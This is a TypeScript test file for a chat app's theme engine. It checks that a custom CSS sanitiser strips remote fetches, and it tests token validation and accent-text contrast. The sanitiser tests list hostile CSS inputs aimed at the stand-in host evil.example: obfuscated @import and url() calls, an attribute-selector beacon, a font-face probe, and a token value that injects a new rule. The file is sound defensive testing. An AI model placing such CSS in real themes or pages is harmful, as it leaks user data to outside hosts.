import { describe, expect, it } from 'vitest';
import { readFileSync } from 'node:fs';
import { ACCENT_PRESETS, BUILTIN_THEMES, DUSK_BASE } from './builtin';
import { contrastRatio } from './color';
import { validateTheme } from './custom';
import { accentContext, buildThemeCss, deriveAccentText, deriveAccentTokens } from './engine';
import { cssUnescape, removedSummary, sanitizeUserCss } from './sanitize';
import { isValidTokenValue, tokenKind } from './tokenValues';

const leaks = (css: string) => /evil\.example/u.test(sanitizeUserCss(css).css);

describe('Custom CSS sanitiser (B1)', () => {
  it.each([
    ['@import with a bare string', '@import"https://evil.example/i1.css";'],
    ['@import with a comment', '@import/**/url(https://evil.example/i2.css);'],
    ['escaped @import', '@\\69mport url(https://evil.example/i3.css);'],
    ['escaped colon in the URL', '@import url(https\\3a //evil.example/i4.css);'],
    ['image-set with a string', 'a{background-image:image-set("https://evil.example/u1.png" 1x)}'],
    ['escaped url()', 'body{background-image:url(https\\:\\/\\/evil.example/u2.png)}'],
    ['protocol-relative', 'a{background:url(//evil.example/x.png)}'],
    [
      'attribute-selector beacon',
      '[aria-label^="Bram"]{background-image:url(https://evil.example/leak.png)}',
    ],
    [
      'unicode-range font probe',
      '@font-face{font-family:x;src:url(https://evil.example/f.woff);unicode-range:U+0041}',
    ],
    ['escaped url function name', 'a{background:\\75rl(https://evil.example/e.png)}'],
    ['uppercase', '@IMPORT URL(HTTPS://evil.example/u.css);'],
  ])('removes %s', (_label, css) => {
    expect(leaks(css)).toBe(false);
    expect(sanitizeUserCss(css).removed.length).toBeGreaterThan(0);
  });

  it('keeps inline data:/blob: resources, including unquoted data URLs with ";"', () => {
    const css =
      'a{background:url(data:image/png;base64,AAAA)}\nb{background-image:url("blob:http://x/1")}';
    expect(sanitizeUserCss(css)).toEqual({ css, removed: [] });
  });

  it('keeps everything else as written and the braces balanced', () => {
    const css =
      ':root { --shrike-accent: #4a90d6; }\n.x { color: red; background: url(https://evil.example/a.png); padding: 2px }';
    const out = sanitizeUserCss(css);
    expect(out.css).toBe(':root { --shrike-accent: #4a90d6; }\n.x { color: red; padding: 2px }');
    expect(removedSummary(out.removed)).toBe('Removed 1 remote reference');
  });

  it('drops a whole block whose prelude fetches', () => {
    const out = sanitizeUserCss(
      '@import url(https://evil.example/m.css) screen { a { color: red } }\nb{color:blue}',
    );
    expect(out.css.trim()).toBe('b{color:blue}');
  });

  it('decodes CSS escapes', () => {
    expect(cssUnescape('@\\69mport')).toBe('@import');
    expect(cssUnescape('https\\3a //x')).toBe('https://x');
    expect(cssUnescape('a\\:b\\\nc')).toBe('a:bc');
  });
});

describe('theme token values (B1)', () => {
  it('classifies tokens', () => {
    expect(tokenKind('accent')).toBe('color');
    expect(tokenKind('bg-chat')).toBe('color');
    expect(tokenKind('radius-md')).toBe('length');
    expect(tokenKind('sidebar-width')).toBe('length');
    expect(tokenKind('font-size-ui')).toBe('length');
    expect(tokenKind('font-scale')).toBe('number');
    expect(tokenKind('font-sans')).toBe('font-family');
    expect(tokenKind('shadow-menu')).toBe('shadow');
    expect(tokenKind('duration-fast')).toBe('duration');
  });

  // happy-dom's CSS.supports is permissive, so the fallback is what's tested here.
  it('allows real values and refuses fetches (fallback without CSS.supports)', () => {
    const supports = null;
    const ok = (n: Parameters<typeof isValidTokenValue>[0], v: string) =>
      isValidTokenValue(n, v, supports);
    expect(ok('accent', '#2fa08f')).toBe(true);
    expect(ok('accent', 'rgb(10 20 30)')).toBe(true);
    expect(ok('radius-md', '12px')).toBe(true);
    expect(ok('accent', '12px')).toBe(false);
    expect(ok('radius-md', 'red')).toBe(false);
    for (const bad of [
      'url(https://evil.example/x.png)',
      'image-set("https://evil.example/x.png" 1x)',
      '\\75rl(https://evil.example)',
      'red; } body { display: none',
      '@import',
      '/* x */ red',
    ])
      expect(ok('accent', bad)).toBe(false);
  });

  it('uses CSS.supports when present', () => {
    const calls: string[] = [];
    const fake = (p: string, v: string) => {
      calls.push(`${p}:${v}`);
      return v === 'papayawhip';
    };
    expect(isValidTokenValue('bg-chat', 'papayawhip', fake)).toBe(true);
    expect(isValidTokenValue('radius-sm', '4px', fake)).toBe(false);
    expect(calls).toEqual(['color:papayawhip', 'width:4px']);
  });

  it('rejects an imported theme with a beaconing token', () => {
    const r = validateTheme({
      name: 'Beacon',
      tokens: { 'bg-chat': 'url(https://evil.example/b.png)' },
    });
    expect(r.ok).toBe(false);
  });
});

describe('accent text colour (M4)', () => {
  it('keeps tokens.css in sync with DUSK_BASE', () => {
    const css = readFileSync('src/ui/styles/tokens.css', 'utf8');
    expect(css).toContain(`--shrike-accent: ${DUSK_BASE.accent};`);
    expect(css).toContain(`--shrike-bg-chat: ${DUSK_BASE['bg-chat']};`);
    const declared = /--shrike-accent-text: (#[0-9a-f]{6});/u.exec(css)?.[1];
    expect(declared).toBe(deriveAccentText(DUSK_BASE.accent, DUSK_BASE['bg-chat']));
  });

  it('moves lightness until text reaches 4.5:1, and leaves good accents alone', () => {
    expect(deriveAccentText('#ffffff', '#000000')).toBe('#ffffff');
    const onPaper = deriveAccentText('#d99a2b', '#faf8f4');
    expect(contrastRatio(onPaper, '#faf8f4')).toBeGreaterThanOrEqual(4.5);
  });

  it.each(BUILTIN_THEMES.map((t) => [t.name, t] as const))(
    'every preset is readable as text and under text on %s',
    (_name, theme) => {
      for (const preset of ACCENT_PRESETS) {
        const { accent, background } = accentContext(theme, preset.value);
        const text = deriveAccentText(accent, background);
        expect(contrastRatio(text, background), `${preset.label} text`).toBeGreaterThanOrEqual(4.5);
        const on = deriveAccentTokens(preset.value, theme.kind)['text-on-accent'] ?? '';
        expect(
          contrastRatio(preset.value, on),
          `${preset.label} text-on-accent`,
        ).toBeGreaterThanOrEqual(4.5);
      }
      const css = buildThemeCss({
        themeId: theme.id,
        accent: null,
        density: 'comfortable',
        fontScale: 1,
        zoom: 1,
        saturation: 1,
        reducedMotion: 'system',
        customCss: '',
      });
      const own = /--shrike-accent-text: (#[0-9a-f]{6});/u.exec(css)?.[1] ?? '';
      expect(
        contrastRatio(own, theme.tokens['bg-chat'] ?? DUSK_BASE['bg-chat']),
      ).toBeGreaterThanOrEqual(4.5);
    },
  );
});
